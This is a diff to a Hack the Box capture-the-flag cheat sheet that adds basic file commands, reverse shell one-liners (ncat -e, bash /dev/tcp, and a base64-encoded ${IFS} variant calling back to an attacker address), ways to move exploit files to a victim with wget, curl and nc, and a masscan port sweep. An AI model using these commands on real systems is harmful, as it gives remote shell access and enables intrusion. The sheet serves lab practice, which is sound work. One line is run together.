@@ -1,7 +1,30 @@
 ## Hack the Box Reference.<br>
 **Contains commands,Link and tricks for challenges**<br>
-gzip<br>
+*gzip*<br>
 gzip -d file.gz<br>
+*list all file in a directory with permission*<br>
+ls -l /home<br>
+In the above it is listing all files of home directory with permissions<br>
+*list all files with hidden*<br>
+ls -a<br>
+*show permission of directory or file*<br>
+ls -ld<br>
+*REVERSE SHELL*<br>
+Victim: ncat -e /bin/bash {IP} {PORT}<br>
+Attacker: Machine:nc -lvnp {PORT}<br>
+python -m SimpleHTTPServer 9999Victim: bash -i >& /dev/tcp/{IP}/{PORT} 0>&1<br>
+Attacker: Machine:nc -lvnp {PORT}<br>
+Victim(Base64): echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45NC85MDA3IDA+JjE|base64${IFS}-d|bash${IFS}-;<br>
+Attacker: Machine:nc -lvnp {PORT}<br>
+
+*File transfer during REVERSE SHELL*<br>
+Attacker: service apache2 start<br>
+place shell or exploit in /var/www/html<br>
+Attacker:python -m SimpleHTTPServer 9999<br>
+Victim: wget 192.168.1.102:9999/file.txt<br>
+Victim: curl -O http://192.168.0.101/file.txt<br>
+Attacker:nc -lvp 4444 < /root/home/exploit.txt<br>
+Victim:nc 192.168.1.102 4444 > exploit.txt<br>
 
 **masscan probe to establish the open ports in the host.**<br>
 #masscan -e tun0 -p1-65535,U:1-65535 10.10.10.101 --rate=700<br>
